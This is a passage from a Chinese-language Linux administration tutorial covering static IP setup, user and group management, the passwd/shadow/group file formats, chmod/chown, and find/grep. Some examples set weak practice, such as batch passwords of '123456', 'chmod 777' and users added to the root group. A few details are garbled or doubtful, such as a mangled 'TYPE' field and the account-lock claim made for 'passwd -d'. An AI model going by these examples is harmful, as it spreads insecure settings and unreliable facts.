00:0c:29:e2:e2:23 brd ff:ff:ff:ff:ff:ff\n    inet 192.168.2.112&#x2F;24 brd 192.168.2.255 scope global noprefixroute ens33\n       valid_lft forever preferred_lft forever\n    inet6 fe80::c94b:6002:cc54:64ca&#x2F;64 scope link noprefixroute \n       valid_lft forever preferred_lft forever\n\n使用vi编辑静态IP地址运行命令vi /etc/sysconfig/network-scripts/ifcfg-ens33其中ens33与ip addr看到的网上编号保持一致\n原来应该是这样的\n\n这里我已经修改过了\nTBLBMCNYPE&#x3D;&quot;Ethernet&quot;\nPROXY_METHOD&#x3D;&quot;none&quot;\nBROWSER_ONLY&#x3D;&quot;no&quot;\n#BOOTPROTO&#x3D;&quot;dhcp&quot;\nBOOTPROTO&#x3D;&quot;static&quot;\nDEFROUTE&#x3D;&quot;yes&quot;\nIPV4_FAILURE_FATAL&#x3D;&quot;no&quot;\nIPV6INIT&#x3D;&quot;yes&quot;\nIPV6_AUTOCONF&#x3D;&quot;yes&quot;\nIPV6_DEFROUTE&#x3D;&quot;yes&quot;\nIPV6_FAILURE_FATAL&#x3D;&quot;no&quot;\nIPV6_ADDR_GEN_MODE&#x3D;&quot;stable-privacy&quot;\nNAME&#x3D;&quot;ens33&quot;\nUUID&#x3D;&quot;571e6521-373a-4fb4-a76f-e9cb7f85afe9&quot;\nDEVICE&#x3D;&quot;ens33&quot;\nONBOOT&#x3D;&quot;yes&quot;\nIPADDR&#x3D;&quot;192.168.2.112&quot;\nNETMASK&#x3D;&quot;255.255.255.0&quot;\nGATEWAY&#x3D;&quot;192.168.2.1&quot;\nDNS1&#x3D;&quot;192.168.2.1&quot;\nDNS2&#x3D;&quot;114.114.114.114&quot;\n~                    \n\n重启网卡,配置生效systemctl restart network\n可以ping一下百度检测是否修改成功\n[root@mycentos opt]# ping www.baidu.com\nPING www.baidu.com (39.156.66.18) 56(84) bytes of data.\n64 bytes from 39.156.66.18 (39.156.66.18): icmp_seq&#x3D;1 ttl&#x3D;51 time&#x3D;41.9 ms\n64 bytes from 39.156.66.18 (39.156.66.18): icmp_seq&#x3D;2 ttl&#x3D;51 time&#x3D;42.0 ms\n64 bytes from 39.156.66.18 (39.156.66.18): icmp_seq&#x3D;3 ttl&#x3D;51 time&#x3D;42.2 ms\n\n\n\n六:文件和文件夹的操作其实具体命令可以参考上文的Linux系统操作,这里就链接几篇写得比较详细的文章\n\n\n\n\n\n\n\n\n\nhttps://blog.csdn.net/luorufeng/article/details/84765059\nhttps://blog.csdn.net/numbibi/article/details/8026841\nhttps://www.woniuxy.com/book/reading/214\n补充:\n\n\n\n\n\n七:用户与用户组权限在Linux中,root拥有最高权限,所有文件或者文件夹的权限设定,对root是无效的.所以在正式的生产环境和服务器中,尽量使用普通账户+人工授权的方式，避免出现安全漏洞后被人以root权限利用系统，导致安全问题。对于权限来说，无论是操作系统，还是应用系统，首先需要具备零信任的意识，永远使用最小权限进行操作。权限不够时再多授予权限即可。\n用户和用户组\nLinux系统是一个多用户多任务的分时操作系统，任何一个要使用系统资源的用户，都必须首先向系统管理员申请一个账号，然后以这个账号的身份进入系统。\n用户的账号一方面可以帮助系统管理员对使用系统的用户进行跟踪，并控制他们对系统资源的访问；另一方面也可以帮助用户组织文件，并为用户提供安全性保护。\n每个用户账号都拥有一个唯一的用户名和各自的口令。\n用户在登录时键入正确的用户名和口令后，就能够进入系统和自己的主目录。\n实现用户账号的管理，要完成的工作主要有如下几个方面：\n\n用户账号的添加、删除与修改。\n用户口令的管理。\n用户组的管理。\n\n\n一、Linux系统用户账号的管理用户账号的管理工作主要涉及到用户账号的添加、修改和删除。\n添加用户账号就是在系统中创建一个新账号，然后为新账号分配用户号、用户组、主目录和登录Shell等资源。刚添加的账号是被锁定的，无法使用。\n1、添加新的用户账号使用useradd命令，其语法如下：useradd 选项 用户名\n\n参数说明：\n\n选项:\n\n-c comment 指定一段注释性描述。\n-d 目录 指定用户主目录，如果此目录不存在，则同时使用-m选项，可以创建主目录。\n-g 用户组 指定用户所属的用户组。\n-G 用户组，用户组 指定用户所属的附加组。\n-s Shell文件 指定用户的登录Shell。\n-u 用户号 指定用户的用户号，如果同时有-o选项，则可以重复使用其他用户的标识号。\n\n\n用户名:\n指定新账号的登录名。\n\n\n实例1\n# useradd –d  &#x2F;home&#x2F;sam -m sam\n\n此命令创建了一个用户sam，其中-d和-m选项用来为登录名sam产生一个主目录 &#x2F;home&#x2F;sam（&#x2F;home为默认的用户主目录所在的父目录）。\n实例2\n# useradd -s &#x2F;bin&#x2F;sh -g group –G adm,root gem\n\n此命令新建了一个用户gem，该用户的登录Shell是 /bin/sh，它属于group用户组，同时又属于adm和root用户组，其中group用户组是其主组。\n这里可能新建组：#groupadd group及groupadd adm\n增加用户账号就是在&#x2F;etc&#x2F;passwd文件中为新用户增加一条记录，同时更新其他系统文件如&#x2F;etc&#x2F;shadow, &#x2F;etc&#x2F;group等。\nLinux提供了集成的系统管理工具userconf，它可以用来对用户账号进行统一管理。\n2、删除帐号如果一个用户的账号不再使用，可以从系统中删除。删除用户账号就是要将&#x2F;etc&#x2F;passwd等系统文件中的该用户记录删除，必要时还删除用户的主目录。\n删除一个已有的用户账号使用userdel命令，其格式如下：\nuserdel 选项 用户名\n\n常用的选项是 -r，它的作用是把用户的主目录一起删除。\n例如：\n# userdel -r sam\n\n此命令删除用户sam在系统文件中（主要是&#x2F;etc&#x2F;passwd, &#x2F;etc&#x2F;shadow, &#x2F;etc&#x2F;group等）的记录，同时删除用户的主目录。\n3、修改帐号修改用户账号就是根据实际情况更改用户的有关属性，如用户号、主目录、用户组、登录Shell等。\n修改已有用户的信息使用usermod命令，其格式如下：\nusermod 选项 用户名\n\n常用的选项包括-c, -d, -m, -g, -G, -s, -u以及-o等，这些选项的意义与useradd命令中的选项一样，可以为用户指定新的资源值。\n另外，有些系统可以使用选项：-l 新用户名\n这个选项指定一个新的账号，即将原来的用户名改为新的用户名。\n例如：\n# usermod -s &#x2F;bin&#x2F;ksh -d &#x2F;home&#x2F;z –g developer sam\n\n此命令将用户sam的登录Shell修改为ksh，主目录改为&#x2F;home&#x2F;z，用户组改为developer。\n4、用户口令的管理用户管理的一项重要内容是用户口令的管理。用户账号刚创建时没有口令，但是被系统锁定，无法使用，必须为其指定口令后才可以使用，即使是指定空口令。\n指定和修改用户口令的Shell命令是passwd。超级用户可以为自己和其他用户指定口令，普通用户只能用它修改自己的口令。命令的格式为：\npasswd 选项 用户名\n\n可使用的选项：\n\n-l 锁定口令，即禁用账号。\n-u 口令解锁。\n-d 使账号无口令。\n-f 强迫用户下次登录时修改口令。\n\n如果默认用户名，则修改当前用户的口令。\n例如，假设当前用户是sam，则下面的命令修改该用户自己的口令：\n$ passwd \nOld password:****** \nNew password:******* \nRe-enter new password:*******\n\n如果是超级用户，可以用下列形式指定任何用户的口令：\n# passwd sam \nNew password:******* \nRe-enter new password:*******\n\n普通用户修改自己的口令时，passwd命令会先询问原口令，验证后再要求用户输入两遍新口令，如果两次输入的口令一致，则将这个口令指定给用户；而超级用户为用户指定口令时，就不需要知道原口令。\n为了系统安全起见，用户应该选择比较复杂的口令，例如最好使用8位长的口令，口令中包含有大写、小写字母和数字，并且应该与姓名、生日等不相同。\n为用户指定空口令时，执行下列形式的命令：\n# passwd -d sam\n\n此命令将用户 sam 的口令删除，这样用户 sam 下一次登录时，系统就不再允许该用户登录了。\npasswd 命令还可以用 -l(lock) 选项锁定某一用户，使其不能登录，例如：\n# passwd -l sam\n\n\n二、Linux系统用户组的管理每个用户都有一个用户组，系统可以对一个用户组中的所有用户进行集中管理。不同Linux 系统对用户组的规定有所不同，如Linux下的用户属于与它同名的用户组，这个用户组在创建用户时同时创建。\n用户组的管理涉及用户组的添加、删除和修改。组的增加、删除和修改实际上就是对&#x2F;etc&#x2F;group文件的更新。\n1、增加一个新的用户组使用groupadd命令。其格式如下：groupadd 选项 用户组\n\n可以使用的选项有：\n\n-g GID 指定新用户组的组标识号（GID）。\n-o 一般与-g选项同时使用，表示新用户组的GID可以与系统已有用户组的GID相同。\n\n实例1：\n# groupadd group1\n\n此命令向系统中增加了一个新组group1，新组的组标识号是在当前已有的最大组标识号的基础上加1。\n实例2：\n# groupadd -g 101 group2\n\n此命令向系统中增加了一个新组group2，同时指定新组的组标识号是101。\n2、如果要删除一个已有的用户组，使用groupdel命令，其格式如下：groupdel 用户组\n\n例如：\n# groupdel group1\n\n此命令从系统中删除组group1。\n3、修改用户组的属性使用groupmod命令。其语法如下：groupmod 选项 用户组\n\n常用的选项有：\n\n-g GID 为用户组指定新的组标识号。\n-o 与-g选项同时使用，用户组的新GID可以与系统已有用户组的GID相同。\n-n新用户组 将用户组的名字改为新名字\n\n实例1：\n# groupmod -g 102 group2\n\n此命令将组group2的组标识号修改为102。\n实例2：\n# groupmod –g 10000 -n group3 group2\n\n此命令将组group2的标识号改为10000，组名修改为group3。\n4、如果一个用户同时属于多个用户组，那么用户可以在用户组之间切换，以便具有其他用户组的权限。用户可以在登录后，使用命令newgrp切换到其他用户组，这个命令的参数就是目的用户组。例如：\n$ newgrp root\n\n这条命令将当前用户切换到root用户组，前提条件是root用户组确实是该用户的主组或附加组。类似于用户账号的管理，用户组的管理也可以通过集成的系统管理工具来完成。\n\n三、与用户账号有关的系统文件完成用户管理的工作有许多种方法，但是每一种方法实际上都是对有关的系统文件进行修改。\n与用户和用户组相关的信息都存放在一些系统文件中，这些文件包括&#x2F;etc&#x2F;passwd, &#x2F;etc&#x2F;shadow, &#x2F;etc&#x2F;group等。\n下面分别介绍这些文件的内容。\n1、&#x2F;etc&#x2F;passwd文件是用户管理工作涉及的最重要的一个文件。Linux系统中的每个用户都在&#x2F;etc&#x2F;passwd文件中有一个对应的记录行，它记录了这个用户的一些基本属性。\n这个文件对所有用户都是可读的。它的内容类似下面的例子：\n＃ cat &#x2F;etc&#x2F;passwd\n\nroot:x:0:0:Superuser:&#x2F;:\ndaemon:x:1:1:System daemons:&#x2F;etc:\nbin:x:2:2:Owner of system commands:&#x2F;bin:\nsys:x:3:3:Owner of system files:&#x2F;usr&#x2F;sys:\nadm:x:4:4:System accounting:&#x2F;usr&#x2F;adm:\nuucp:x:5:5:UUCP administrator:&#x2F;usr&#x2F;lib&#x2F;uucp:\nauth:x:7:21:Authentication administrator:&#x2F;tcb&#x2F;files&#x2F;auth:\ncron:x:9:16:Cron daemon:&#x2F;usr&#x2F;spool&#x2F;cron:\nlisten:x:37:4:Network daemon:&#x2F;usr&#x2F;net&#x2F;nls:\nlp:x:71:18:Printer administrator:&#x2F;usr&#x2F;spool&#x2F;lp:\nsam:x:200:50:Sam san:&#x2F;home&#x2F;sam:&#x2F;bin&#x2F;sh\n\n从上面的例子我们可以看到，&#x2F;etc&#x2F;passwd中一行记录对应着一个用户，每行记录又被冒号(:)分隔为7个字段，其格式和具体含义如下：\n用户名:口令:用户标识号:组标识号:注释性描述:主目录:登录Shell\n\n1）”用户名”是代表用户账号的字符串。通常长度不超过8个字符，并且由大小写字母和&#x2F;或数字组成。登录名中不能有冒号(:)，因为冒号在这里是分隔符。\n为了兼容起见，登录名中最好不要包含点字符(.)，并且不使用连字符(-)和加号(+)打头。\n2）“口令”一些系统中，存放着加密后的用户口令字。虽然这个字段存放的只是用户口令的加密串，不是明文，但是由于&#x2F;etc&#x2F;passwd文件对所有用户都可读，所以这仍是一个安全隐患。因此，现在许多Linux 系统（如SVR4）都使用了shadow技术，把真正的加密后的用户口令字存放到&#x2F;etc&#x2F;shadow文件中，而在&#x2F;etc&#x2F;passwd文件的口令字段中只存放一个特殊的字符，例如“x”或者“*”。\n3）“用户标识号”是一个整数，系统内部用它来标识用户。一般情况下它与用户名是一一对应的。如果几个用户名对应的用户标识号是一样的，系统内部将把它们视为同一个用户，但是它们可以有不同的口令、不同的主目录以及不同的登录Shell等。\n通常用户标识号的取值范围是0～65 535。0是超级用户root的标识号，1～99由系统保留，作为管理账号，普通用户的标识号从100开始。在Linux系统中，这个界限是500。\n4）“组标识号”字段记录的是用户所属的用户组。它对应着&#x2F;etc&#x2F;group文件中的一条记录。\n5)“注释性描述”字段记录着用户的一些个人情况。例如用户的真实姓名、电话、地址等，这个字段并没有什么实际的用途。在不同的Linux 系统中，这个字段的格式并没有统一。在许多Linux系统中，这个字段存放的是一段任意的注释性描述文字，用做finger命令的输出。\n6)“主目录”，也就是用户的起始工作目录。它是用户在登录到系统之后所处的目录。在大多数系统中，各用户的主目录都被组织在同一个特定的目录下，而用户主目录的名称就是该用户的登录名。各用户对自己的主目录有读、写、执行（搜索）权限，其他用户对此目录的访问权限则根据具体情况设置。\n7)用户登录后，要启动一个进程，负责将用户的操作传给内核，这个进程是用户登录到系统后运行的命令解释器或某个特定的程序，即Shell。Shell是用户与Linux系统之间的接口。Linux的Shell有许多种，每种都有不同的特点。常用的有sh(Bourne Shell), csh(C Shell), ksh(Korn Shell), tcsh(TENEX&#x2F;TOPS-20 type C Shell), bash(Bourne Again Shell)等。\n系统管理员可以根据系统情况和用户习惯为用户指定某个Shell。如果不指定Shell，那么系统使用sh为默认的登录Shell，即这个字段的值为&#x2F;bin&#x2F;sh。\n用户的登录Shell也可以指定为某个特定的程序（此程序不是一个命令解释器）。\n利用这一特点，我们可以限制用户只能运行指定的应用程序，在该应用程序运行结束后，用户就自动退出了系统。有些Linux 系统要求只有那些在系统中登记了的程序才能出现在这个字段中。\n8)系统中有一类用户称为伪用户（pseudo users）。这些用户在&#x2F;etc&#x2F;passwd文件中也占有一条记录，但是不能登录，因为它们的登录Shell为空。它们的存在主要是方便系统管理，满足相应的系统进程对文件属主的要求。\n常见的伪用户如下所示：\n伪 用 户 含 义 \nbin 拥有可执行的用户命令文件 \nsys 拥有系统文件 \nadm 拥有帐户文件 \nuucp UUCP使用 \nlp lp或lpd子系统使用 \nnobody NFS使用\n\n\n拥有帐户文件1、除了上面列出的伪用户外，还有许多标准的伪用户，例如：audit, cron, mail, usenet等，它们也都各自为相关的进程和文件所需要。\n由于&#x2F;etc&#x2F;passwd文件是所有用户都可读的，如果用户的密码太简单或规律比较明显的话，一台普通的计算机就能够很容易地将它破解，因此对安全性要求较高的Linux系统都把加密后的口令字分离出来，单独存放在一个文件中，这个文件是&#x2F;etc&#x2F;shadow文件。 有超级用户才拥有该文件读权限，这就保证了用户密码的安全性。\n2、&#x2F;etc&#x2F;shadow中的记录行与&#x2F;etc&#x2F;passwd中的一一对应，它由pwconv命令根据&#x2F;etc&#x2F;passwd中的数据自动产生\n它的文件格式与&#x2F;etc&#x2F;passwd类似，由若干个字段组成，字段之间用”:”隔开。这些字段是：\n登录名:加密口令:最后一次修改时间:最小时间间隔:最大时间间隔:警告时间:不活动时间:失效时间:标志\n\n\n“登录名”是与&#x2F;etc&#x2F;passwd文件中的登录名相一致的用户账号\n“口令”字段存放的是加密后的用户口令字，长度为13个字符。如果为空，则对应用户没有口令，登录时不需要口令；如果含有不属于集合 { .&#x2F;0-9A-Za-z }中的字符，则对应的用户不能登录。\n“最后一次修改时间”表示的是从某个时刻起，到用户最后一次修改口令时的天数。时间起点对不同的系统可能不一样。例如在SCO Linux 中，这个时间起点是1970年1月1日。\n“最小时间间隔”指的是两次修改口令之间所需的最小天数。\n“最大时间间隔”指的是口令保持有效的最大天数。\n“警告时间”字段表示的是从系统开始警告用户到用户密码正式失效之间的天数。\n“不活动时间”表示的是用户没有登录活动但账号仍能保持有效的最大天数。\n“失效时间”字段给出的是一个绝对的天数，如果使用了这个字段，那么就给出相应账号的生存期。期满后，该账号就不再是一个合法的账号，也就不能再用来登录了。\n\n下面是&#x2F;etc&#x2F;shadow的一个例子：\n＃ cat &#x2F;etc&#x2F;shadow\n\nroot:Dnakfw28zf38w:8764:0:168:7:::\ndaemon:*::0:0::::\nbin:*::0:0::::\nsys:*::0:0::::\nadm:*::0:0::::\nuucp:*::0:0::::\nnuucp:*::0:0::::\nauth:*::0:0::::\ncron:*::0:0::::\nlisten:*::0:0::::\nlp:*::0:0::::\nsam:EkdiSECLWPdSa:9740:0:0::::\n\n3、用户组的所有信息都存放在&#x2F;etc&#x2F;group文件中。将用户分组是Linux 系统中对用户进行管理及控制访问权限的一种手段。\n每个用户都属于某个用户组；一个组中可以有多个用户，一个用户也可以属于不同的组。\n当一个用户同时是多个组中的成员时，在&#x2F;etc&#x2F;passwd文件中记录的是用户所属的主组，也就是登录时所属的默认组，而其他组称为附加组。\n用户要访问属于附加组的文件时，必须首先使用newgrp命令使自己成为所要访问的组中的成员。\n用户组的所有信息都存放在&#x2F;etc&#x2F;group文件中。此文件的格式也类似于&#x2F;etc&#x2F;passwd文件，由冒号(:)隔开若干个字段，这些字段有：\n组名:口令:组标识号:组内用户列表\n\n\n“组名”是用户组的名称，由字母或数字构成。与&#x2F;etc&#x2F;passwd中的登录名一样，组名不应重复。\n“口令”字段存放的是用户组加密后的口令字。一般Linux 系统的用户组都没有口令，即这个字段一般为空，或者是*。\n“组标识号”与用户标识号类似，也是一个整数，被系统内部用来标识组。\n“组内用户列表”是属于这个组的所有用户的列表，不同用户之间用逗号(,)分隔。这个用户组可能是用户的主组，也可能是附加组。\n\n&#x2F;etc&#x2F;group文件的一个例子如下：\nroot::0:root\nbin::2:root,bin\nsys::3:root,uucp\nadm::4:root,adm\ndaemon::5:root,daemon\nlp::7:root,lp\nusers::20:root,sam\n\n四、添加批量用户添加和删除用户对每位Linux系统管理员都是轻而易举的事，比较棘手的是如果要添加几十个、上百个甚至上千个用户时，我们不太可能还使用useradd一个一个地添加，必然要找一种简便的创建大量用户的方法。Linux系统提供了创建大量用户的工具，可以让您立即创建大量用户，方法如下：\n（1）先编辑一个文本用户文件。每一列按照/etc/passwd密码文件的格式书写，要注意每个用户的用户名、UID、宿主目录都不可以相同，其中密码栏可以留做空白或输入x号。一个范例文件user.txt内容如下：\nuser001::600:100:user:&#x2F;home&#x2F;user001:&#x2F;bin&#x2F;bash\nuser002::601:100:user:&#x2F;home&#x2F;user002:&#x2F;bin&#x2F;bash\nuser003::602:100:user:&#x2F;home&#x2F;user003:&#x2F;bin&#x2F;bash\nuser004::603:100:user:&#x2F;home&#x2F;user004:&#x2F;bin&#x2F;bash\nuser005::604:100:user:&#x2F;home&#x2F;user005:&#x2F;bin&#x2F;bash\nuser006::605:100:user:&#x2F;home&#x2F;user006:&#x2F;bin&#x2F;bash\n\n（2）以root身份执行命令 /usr/sbin/newusers，从刚创建的用户文件user.txt中导入数据，创建用户：# newusers &lt; user.txt\n\n然后可以执行命令 vipw 或 vi /etc/passwd 检查 /etc/passwd 文件是否已经出现这些用户的数据，并且用户的宿主目录是否已经创建。\n（3）执行命令&#x2F;usr&#x2F;sbin&#x2F;pwunconv。将 /etc/shadow 产生的 shadow 密码解码，然后回写到 /etc/passwd 中，并将/etc/shadow的shadow密码栏删掉。这是为了方便下一步的密码转换工作，即先取消 shadow password 功能。\n# pwunconv\n\n（4）编辑每个用户的密码对照文件。格式为：\n用户名:密码\n\n实例文件 passwd.txt 内容如下：\nuser001:123456\nuser002:123456\nuser003:123456\nuser004:123456\nuser005:123456\nuser006:123456\n\n（5）以 root 身份执行命令 /usr/sbin/chpasswd。创建用户密码，chpasswd 会将经过 /usr/bin/passwd 命令编码过的密码写入 /etc/passwd 的密码栏。\n# chpasswd &lt; passwd.txt\n\n（6）确定密码经编码写入&#x2F;etc&#x2F;passwd的密码栏后。执行命令 /usr/sbin/pwconv 将密码编码为 shadow password，并将结果写入 /etc/shadow。\n# pwconv\n\n这样就完成了大量用户的创建了，之后您可以到&#x2F;home下检查这些用户宿主目录的权限设置是否都正确，并登录验证用户密码是否正确。\n文件和文件夹权限\n\nLinux 系统是一种典型的多用户系统，不同的用户处于不同的地位，拥有不同的权限。\n为了保护系统的安全性，Linux 系统对不同的用户访问同一文件（包括目录文件）的权限做了不同的规定。\n在 Linux 中我们通常使用以下两个命令来修改文件或目录的所属用户与权限：\n\nchown (change owner) ： 修改所属用户与组。\nchmod (change mode) ： 修改用户的权限。\n\n下图中通过 chown 来授权用户，通过 chmod 为用户设置可以开门的权限。\n\n在 Linux 中我们可以使用 ll 或者 ls –l 命令来显示一个文件的属性以及文件所属的用户和组，如：\n[root@www &#x2F;]# ls -l\ntotal 64\ndr-xr-xr-x   2 root root 4096 Dec 14  2012 bin\ndr-xr-xr-x   4 root root 4096 Apr 19  2012 boot\n……\n\n实例中，bin 文件的第一个属性用 d 表示。d 在 Linux 中代表该文件是一个目录文件。\n在 Linux 中第一个字符代表这个文件是目录、文件或链接文件等等。\n\n当为 d 则是目录\n当为 - 则是文件；\n若是 l 则表示为链接文档(link file)；\n若是 b 则表示为装置文件里面的可供储存的接口设备(可随机存取装置)；\n若是 c 则表示为装置文件里 面的串行端口设备，例如键盘、鼠标(一次性读取装置)。\n\n接下来的字符中，以三个为一组，且均为 rwx 的三个参数的组合。其中， r 代表可读(read)、 w 代表可写(write)、 x 代表可执行(execute)。 要注意的是，这三个权限的位置不会改变，如果没有权限，就会出现减号 - 而已。\n\n\n每个文件的属性由左边第一部分的 10 个字符来确定（如下图）。\n\n从左至右用 0-9 这些数字来表示。\n第 0 位确定文件类型，第 1-3 位确定属主（该文件的所有者）拥有该文件的权限。\n第4-6位确定属组（所有者的同组用户）拥有该文件的权限，第7-9位确定其他用户拥有该文件的权限。\n其中，第 1、4、7 位表示读权限，如果用 r 字符表示，则有读权限，如果用 - 字符表示，则没有读权限；\n第 2、5、8 位表示写权限，如果用 w 字符表示，则有写权限，如果用 - 字符表示没有写权限；第 3、6、9 位表示可执行权限，如果用 x 字符表示，则有执行权限，如果用 - 字符表示，则没有执行权限。\n\nLinux文件属主和属组[root@www &#x2F;]# ls -l\ntotal 64\ndrwxr-xr-x 2 root  root  4096 Feb 15 14:46 cron\ndrwxr-xr-x 3 mysql mysql 4096 Apr 21  2014 mysql\n……\n\n对于文件来说，它都有一个特定的所有者，也就是对该文件具有所有权的用户。\n同时，在Linux系统中，用户是按组分类的，一个用户属于一个或多个组。\n文件所有者以外的用户又可以分为文件所属组的同组用户和其他用户。\n因此，Linux系统按文件所有者、文件所有者同组用户和其他用户来规定了不同的文件访问权限。\n在以上实例中，mysql 文件是一个目录文件，属主和属组都为 mysql，属主有可读、可写、可执行的权限；与属主同组的其他用户有可读和可执行的权限；其他用户也有可读和可执行的权限。\n对于 root 用户来说，一般情况下，文件的权限对其不起作用。\n\n更改文件属性1、chgrp：更改文件属组语法：\nchgrp [-R] 属组名 文件名\n\n参数选项\n\n-R：递归更改文件属组，就是在更改某个目录文件的属组时，如果加上-R的参数，那么该目录下的所有文件的属组都会更改。\n\n2、chown：更改文件属主，也可以同时更改文件属组语法：\nchown [–R] 属主名 文件名\nchown [-R] 属主名：属组名 文件名\n\n进入 &#x2F;root 目录（~）将install.log的拥有者改为bin这个账号：\n[root@www ~] cd ~\n[root@www ~]# chown bin install.log\n[root@www ~]# ls -l\n-rw-r--r--  1 bin  users 68495 Jun 25 08:53 install.log\n\n将install.log的拥有者与群组改回为root：\n[root@www ~]# chown root:root install.log\n[root@www ~]# ls -l\n-rw-r--r--  1 root root 68495 Jun 25 08:53 install.log\n\n3、chmod：更改文件9个属性Linux文件属性有两种设置方法，一种是数字，一种是符号。\nLinux 文件的基本权限就有九个，分别是 owner&#x2F;group&#x2F;others(拥有者&#x2F;组&#x2F;其他) 三种身份各有自己的 read&#x2F;write&#x2F;execute 权限。\n先复习一下刚刚上面提到的数据：文件的权限字符为： -rwxrwxrwx ， 这九个权限是三个三个一组的！其中，我们可以使用数字来代表各个权限，各权限的分数对照表如下：\n\nr:4\nw:2\nx:1\n\n每种身份(owner&#x2F;group&#x2F;others)各自的三个权限(r&#x2F;w&#x2F;x)分数是需要累加的，例如当权限为： -rwxrwx— 分数则是：\n\nowner &#x3D; rwx &#x3D; 4+2+1 &#x3D; 7\ngroup &#x3D; rwx &#x3D; 4+2+1 &#x3D; 7\nothers&#x3D; — &#x3D; 0+0+0 &#x3D; 0\n\n所以等一下我们设定权限的变更时，该文件的权限数字就是 770。变更权限的指令 chmod 的语法是这样的：\nchmod [-R] xyz 文件或目录\n\n选项与参数：\n\nxyz : 就是刚刚提到的数字类型的权限属性，为 rwx 属性数值的相加。\n-R : 进行递归(recursive)的持续变更，以及连同次目录下的所有文件都会变更\n\n举例来说，如果要将 .bashrc 这个文件所有的权限都设定启用，那么命令如下：\n[root@www ~]# ls -al .bashrc\n-rw-r--r--  1 root root 395 Jul  4 11:45 .bashrc\n[root@www ~]# chmod 777 .bashrc\n[root@www ~]# ls -al .bashrc\n-rwxrwxrwx  1 root root 395 Jul  4 11:45 .bashrc\n\n那如果要将权限变成 -rwxr-xr– 呢？那么权限的分数就成为 [4+2+1][4+0+1][4+0+0]&#x3D;754。\n符号类型改变文件权限还有一个改变权限的方法，从之前的介绍中我们可以发现，基本上就九个权限分别是：\n\nuser：用户\ngroup：组\nothers：其他\n\n那么我们就可以使用 u, g, o 来代表三种身份的权限。\n此外， a 则代表 all，即全部的身份。读写的权限可以写成 r, w, x，也就是可以使用下表的方式来看：\n\n\n\nchmod\nu g o a\n+(加入) -(除去) &#x3D;(设定)\nr w x\n文件或目录\n\n\n\n\n\n\n\n\n\n\n如果我们需要将文件权限设置为 -rwxr-xr– ，可以使用 chmod u&#x3D;rwx,g&#x3D;rx,o&#x3D;r 文件名 来设定:\n#  touch test1    &#x2F;&#x2F; 创建 test1 文件\n# ls -al test1    &#x2F;&#x2F; 查看 test1 默认权限\n-rw-r--r-- 1 root root 0 Nov 15 10:32 test1\n# chmod u&#x3D;rwx,g&#x3D;rx,o&#x3D;r  test1    &#x2F;&#x2F; 修改 test1 权限\n# ls -al test1\n-rwxr-xr-- 1 root root 0 Nov 15 10:32 test1\n\n而如果是要将权限去掉而不改变其他已存在的权限呢？例如要拿掉全部人的可执行权限，则：\n#  chmod  a-x test1\n# ls -al test1\n-rw-r--r-- 1 root root 0 Nov 15 10:32 test1\n\n\n\n八：文件查找与归档压缩\n\nLinux find 命令Linux find 命令用来在指定目录下查找文件。任何位于参数之前的字符串都将被视为欲查找的目录名。如果使用该命令时，不设置任何参数，则 find 命令将在当前目录下查找子目录与文件。并且将查找到的子目录和文件全部进行显示。\n语法find   path   -option   [   -print ]   [ -exec   -ok   command ]   &#123;&#125; \\;\n\n参数说明 :\nfind 根据下列规则判断 path 和 expression，在命令列上第一个 - ( ) , ! 之前的部份为 path，之后的是 expression。如果 path 是空字串则使用目前路径，如果 expression 是空字串则使用 -print 为预设 expression。\nexpression 中可使用的选项有二三十个之多，在此只介绍最常用的部份。\n-mount, -xdev : 只检查和指定目录在同一个文件系统下的文件，避免列出其它文件系统中的文件\n-amin n : 在过去 n 分钟内被读取过\n-anewer file : 比文件 file 更晚被读取过的文件\n-atime n : 在过去 n 天内被读取过的文件\n-cmin n : 在过去 n 分钟内被修改过\n-cnewer file :比文件 file 更新的文件\n-ctime n : 在过去 n 天内创建的文件\n-mtime n : 在过去 n 天内修改过的文件\n-empty : 空的文件-gid n or -group name : gid 是 n 或是 group 名称是 name\n-ipath p, -path p : 路径名称符合 p 的文件，ipath 会忽略大小写\n-name name, -iname name : 文件名称符合 name 的文件。iname 会忽略大小写\n-size n : 文件大小 是 n 单位，b 代表 512 位元组的区块，c 表示字元数，k 表示 kilo bytes，w 是二个位元组。\n-type c : 文件类型是 c 的文件。\nd: 目录\nc: 字型装置文件\nb: 区块装置文件\np: 具名贮列\nf: 一般文件\nl: 符号连结\ns: socket\n-pid n : process id 是 n 的文件\n你可以使用 ( ) 将运算式分隔，并使用下列运算。\nexp1 -and exp2\n! expr\n-not expr\nexp1 -or exp2\nexp1, exp2\n实例将当前目录及其子目录下所有文件后缀为 .c 的文件列出来:\n# find . -name &quot;*.c&quot;\n\n将当前目录及其子目录中的所有文件列出：\n# find . -type f\n\n将当前目录及其子目录下所有最近 20 天内更新过的文件列出:\n# find . -ctime  20\n\n查找 &#x2F;var&#x2F;log 目录中更改时间在 7 日以前的普通文件，并在删除之前询问它们：\n# find &#x2F;var&#x2F;log -type f -mtime +7 -ok rm &#123;&#125; \\;\n\n查找当前目录中文件属主具有读、写权限，并且文件所属组的用户和其他用户具有读权限的文件：\n# find . -type f -perm 644 -exec ls -l &#123;&#125; \\;\n\n查找系统中所有文件长度为 0 的普通文件，并列出它们的完整路径：\n# find &#x2F; -type f -size 0 -exec ls -l &#123;&#125; \\;\n\n\n\nLinux grep 命令Linux grep 命令用于查找文件里符合条件的字符串。\ngrep 指令用于查找内容包含指定的范本样式的文件，如果发现某文件的内容符合所指定的范本样式，预设 grep 指令会把含有范本样式的那一列显示出来。若不指定任何文件名称，或是所给予的文件名为 **-**，则 grep 指令会从标准输入设备读取数据。\n语法grep [-abcEFGhHilLnqrsvVwxy][-A&lt;显示行数&gt;][-B&lt;显示列数&gt;][-C&lt;显示列数&gt;][-d&lt;进行动作&gt;][-e&lt;范本样式&gt;][-f&lt;范本文件&gt;][--help][范本样式][文件或目录...]\n\n参数：\n\n-a 或 –text : 不要忽略二进制的数据。\n-A&lt;显示行数&gt; 或 –after-context&#x3D;&lt;显示行数&gt; : 除了显示符合范本样式的那一列之外，并显示该行之后的内容。\n-b 或 –byte-offset : 在显示符合样式的那一行之前，标示出该行第一个字符的编号。\n-B&lt;显示行数&gt; 或 –before-context&#x3D;&lt;显示行数&gt; : 除了显示符合样式的那一行之外，并显示该行之前的内容。\n-c 或 –count : 计算符合样式的列数。\n-C&lt;显示行数&gt; 或 –context&#x3D;&lt;显示行数&gt;或-&lt;显示行数&gt; : 除了显示符合样式的那一行之外，并显示该行之前后的内容。\n-d &lt;动作&gt; 或 –directories&#x3D;&lt;动作&gt; : 